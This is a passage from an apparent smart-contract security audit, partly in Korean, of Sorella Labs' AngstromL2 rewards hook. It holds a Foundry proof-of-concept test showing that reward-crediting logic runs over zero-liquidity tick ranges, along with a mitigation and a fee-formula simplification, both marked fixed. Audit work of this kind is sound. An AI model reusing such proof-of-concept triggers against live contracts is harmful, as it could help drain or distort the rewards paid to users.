        int24 tickLower,
        int24 tickUpper,
        uint128 liquidityAmount
    ) internal returns (BalanceDelta delta) {
        require(tickLower % key.tickSpacing == 0, "Lower tick not aligned");
        require(tickUpper % key.tickSpacing == 0, "Upper tick not aligned");
        require(tickLower < tickUpper, "Invalid tick range");

        (delta,) = router.modifyLiquidity(
            key, tickLower, tickUpper, int256(uint256(liquidityAmount)), bytes32(0)
        );

        // console.log("delta.amount0(): %s", delta.amount0().fmtD());
        // console.log("delta.amount1(): %s", delta.amount1().fmtD());
        positionRanges.push([tickLower, tickUpper]);

        return delta;
    }

    /*
     *  Shows that this doesn't revert even though it crosses through
     *  a range of zero liquidity
     */
    function test_cyfrin_TestOneForZeroOnZeroLiquidityRange() public {
        PoolKey memory key = initializePool(address(token), 10, 3);

        setPriorityFee(100 gwei);
        addLiquidity(key, 0,  10, 1e22);
        /* Leave a gap of zero liquidity */
        addLiquidity(key, 20, 30, 1e22);
        router.swap(key, false, 1000e18, int24(25).getSqrtPriceAtTick());
        logRewards("after", key);
    }

    function test_cyfrin_PoolRewardsGetGrowthDeltaDoesntRevertOnZeroLiqudity() public {
        PoolRewardsLib.getGrowthDelta(0,0);
    }

    error RewardOverflow();

    /// forge-config: default.allow_internal_expect_revert = true
    function test_cyfrin_GetGrowthDeltaWouldRevertWithoutRawDiv() public {
         vm.expectRevert();
        _getGrowthDelta(0,0);
    }

    function test_cyfrin_OneForZeroCreditRewardsWorksWithModifiedLogic() public {
        uint128 LIQUIDITY = 1e22;
        uint256 PRIORITY_FEE = 100 gwei;
        int24[4] memory TICKS_TO_CHECK = [int24(0), 10, 20, 30];


        PoolKey memory key = initializePool(address(token), 10, 3);
        PoolId id = key.toId();

        setPriorityFee(PRIORITY_FEE);
        addLiquidity(key, 0,  10, LIQUIDITY);
        /* Leave a gap of zero liquidity */
        addLiquidity(key, 20, 30, LIQUIDITY);

        Slot0 slot0BeforeSwap = manager.getSlot0(id);
        router.swap(key, false, 1000e18, int24(25).getSqrtPriceAtTick());
        Slot0 slot0AfterSwap = manager.getSlot0(id);

        TickIteratorUp memory ticks = TickIteratorLib.initUp(
            IPoolManager(manager), id, 10, slot0BeforeSwap.tick(), slot0AfterSwap.tick()
        );

        uint256 taxInEther = angstrom.getSwapTaxAmount(PRIORITY_FEE);

        (int24 lastTick, uint160 pstarSqrtX96) = CompensationPriceFinder.getOneForZero(
            ticks, LIQUIDITY, taxInEther, slot0BeforeSwap, slot0AfterSwap
        );

        _oneForZeroCreditRewardsModified(ticks,1e22,taxInEther,slot0BeforeSwap.sqrtPriceX96(),lastTick,pstarSqrtX96);
        _oneForZeroCreditRewardsOriginal(ticks,1e22,taxInEther,slot0BeforeSwap.sqrtPriceX96(),lastTick,pstarSqrtX96);

        assertEq(rewardsOriginal[id].globalGrowthX128, rewardsModified[id].globalGrowthX128);


        for (uint256 i = 0; i < TICKS_TO_CHECK.length; i++) {
            int24 tick = TICKS_TO_CHECK[i];
            assertEq(rewardsOriginal[id].rewardGrowthOutsideX128[tick],
                     rewardsModified[id].rewardGrowthOutsideX128[tick]);
        }

    }


    /*********************************************************************/

    /*
     * Logic copied from PoolRewardsLib.getGrowthDelta and modified to not use `rawDiv`
     */
    function _getGrowthDelta(uint256 reward, uint256 liquidity)
        internal
        pure
        returns (uint256 growthDelta)
    {
        if (!(reward < 1 << 128)) revert RewardOverflow();
        return (reward << 128) / (liquidity);
    }

    function _min(uint160 x, uint160 y) internal pure returns (uint160) {
        return x < y ? x : y;
    }

    /*
     * Logic copied from AngstromL2.sol and modified to have following if-condition:
     *
     *    if (tickNext <= lastTick && liquidity != 0) {
     *
     * Also code modifies `rewardsModified` instead of `rewards` mapping
     */
    function _oneForZeroCreditRewardsModified(
        TickIteratorUp memory ticks,
        uint128 liquidity,
        uint256 taxInEther,
        uint160 priceLowerSqrtX96,
        int24 lastTick,
        uint160 pstarSqrtX96
    ) internal {
        uint256 pstarX96 = uint256(pstarSqrtX96).mulX96(pstarSqrtX96);
        uint256 cumulativeGrowthX128 = 0;
        uint160 priceUpperSqrtX96;

        while (ticks.hasNext()) {
            int24 tickNext = ticks.getNext();

            priceUpperSqrtX96 = _min(TickMath.getSqrtPriceAtTick(tickNext), pstarSqrtX96);

            uint256 rangeReward = 0;
            if (tickNext <= lastTick && liquidity != 0) {
                uint256 delta0 = SqrtPriceMath.getAmount0Delta(
                    priceLowerSqrtX96, priceUpperSqrtX96, liquidity, false
                );
                uint256 delta1 = SqrtPriceMath.getAmount1Delta(
                    priceLowerSqrtX96, priceUpperSqrtX96, liquidity, false
                );
                rangeReward = (delta0 - delta1.divX96(pstarX96)).min(taxInEther);

                unchecked {
                    taxInEther -= rangeReward;
                    cumulativeGrowthX128 += PoolRewardsLib.getGrowthDelta(rangeReward, liquidity);
                }
            }

            unchecked {
                rewardsModified[ticks.poolId].rewardGrowthOutsideX128[tickNext] += cumulativeGrowthX128;
            }

            (, int128 liquidityNet) = ticks.manager.getTickLiquidity(ticks.poolId, tickNext);
            liquidity = liquidity.add(liquidityNet);

            priceLowerSqrtX96 = priceUpperSqrtX96;
        }

        // Distribute remainder to last range and update global accumulator.
        unchecked {
            cumulativeGrowthX128 += PoolRewardsLib.getGrowthDelta(taxInEther, liquidity);
            rewardsModified[ticks.poolId].globalGrowthX128 += cumulativeGrowthX128;
        }
    }

    /*
     * Original logic for _oneForZeroCreditRewards but modifying `rewardsOriginal` instead of `rewards` mapping
     */

    function _oneForZeroCreditRewardsOriginal(
        TickIteratorUp memory ticks,
        uint128 liquidity,
        uint256 taxInEther,
        uint160 priceLowerSqrtX96,
        int24 lastTick,
        uint160 pstarSqrtX96
    ) internal {
        uint256 pstarX96 = uint256(pstarSqrtX96).mulX96(pstarSqrtX96);
        uint256 cumulativeGrowthX128 = 0;
        uint160 priceUpperSqrtX96;

        while (ticks.hasNext()) {
            int24 tickNext = ticks.getNext();

            priceUpperSqrtX96 = _min(TickMath.getSqrtPriceAtTick(tickNext), pstarSqrtX96);

            uint256 rangeReward = 0;
            if (tickNext <= lastTick || liquidity == 0) {
                uint256 delta0 = SqrtPriceMath.getAmount0Delta(
                    priceLowerSqrtX96, priceUpperSqrtX96, liquidity, false
                );
                uint256 delta1 = SqrtPriceMath.getAmount1Delta(
                    priceLowerSqrtX96, priceUpperSqrtX96, liquidity, false
                );
                rangeReward = (delta0 - delta1.divX96(pstarX96)).min(taxInEther);

                unchecked {
                    taxInEther -= rangeReward;
                    cumulativeGrowthX128 += PoolRewardsLib.getGrowthDelta(rangeReward, liquidity);
                }
            }

            unchecked {
                rewardsOriginal[ticks.poolId].rewardGrowthOutsideX128[tickNext] += cumulativeGrowthX128;
            }

            (, int128 liquidityNet) = ticks.manager.getTickLiquidity(ticks.poolId, tickNext);
            liquidity = liquidity.add(liquidityNet);

            priceLowerSqrtX96 = priceUpperSqrtX96;
        }

        // Distribute remainder to last range and update global accumulator.
        unchecked {
            cumulativeGrowthX128 += PoolRewardsLib.getGrowthDelta(taxInEther, liquidity);
            rewardsOriginal[ticks.poolId].globalGrowthX128 += cumulativeGrowthX128;
        }
    }



    /*
     * Helper functions
     */

    function logRewards(string memory s, PoolKey memory key) internal {
        bytes32 SALT = bytes32(0);
        console2.log("Rewards %s {", s);
        for (uint256 i = 0; i < positionRanges.length; i++) {

            int24 lower = positionRanges[i][0];
            int24 upper = positionRanges[i][1];

            uint256 rewards = angstrom.getPendingPositionRewards(key, address(router), lower, upper, SALT);
            console2.log("  rewards in [%s,%s]: %s", vm.toString(lower), vm.toString(upper), rewards.pretty());
        }
        console2.log("}");
    }
}
```

**권장 완화 방법:** `AngstromL2::_oneForZeroCreditRewards` 내의 조건을 다음과 같이 수정하십시오:

```solidity
if (tickNext <= lastTick && liquidity != 0)
```

**Sorella Labs:** 커밋 [d53cc19](https://github.com/SorellaLabs/l2-angstrom/commit/d53cc197c43fc2d1db6d946def3fe847c2e1281c)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `AngstromL2::_computeAndCollectProtocolSwapFee` 계산 단순화 가능

**설명:** `AngstromL2::_computeAndCollectProtocolSwapFee`는 현재 다음 계산을 수행합니다:

```solidity
    uint256 fee = exactIn
        ? absTargetAmount * protocolFeeE6 / FACTOR_E6
@>      : absTargetAmount * FACTOR_E6 / (FACTOR_E6 - protocolFeeE6) - absTargetAmount;
    fee128 = fee.toInt128();
```

그러나 강조된 줄은 다음과 같이 단순화할 수 있습니다:

```diff
absTargetAmount * protocolFeeE6 / (FACTOR_E6 - protocolFeeE6)
```

**Sorella Labs:** 커밋 [aa90806](https://github.com/SorellaLabs/l2-angstrom/commit/aa9080697d683aae327de2c64f638f2730c193dd)에서 수정되었습니다.

**Cyfrin:** 확인됨. 계산이 단순화되었습니다.
